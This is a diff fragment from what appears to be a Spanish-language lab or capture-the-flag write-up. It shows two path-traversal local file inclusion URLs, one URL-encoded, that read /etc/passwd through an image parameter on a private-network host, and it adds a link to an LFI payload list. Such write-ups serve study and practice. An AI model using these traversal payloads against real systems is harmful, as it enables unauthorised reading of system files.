@@ -73,4 +73,7 @@ Opción 1) http://192.168.1.10/antibot_image/antibots/info.php?image=%2E%2E%2F%2
 
 Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../etc/passwd
 ```
+LFI Payloads: https://github.com/rezaJOY/Local-File-Inclusion-Payloads
+
 ![9](https://user-images.githubusercontent.com/75953873/174934453-b1182f6c-2ce0-4028-8947-d357988b8c4d.png)
+
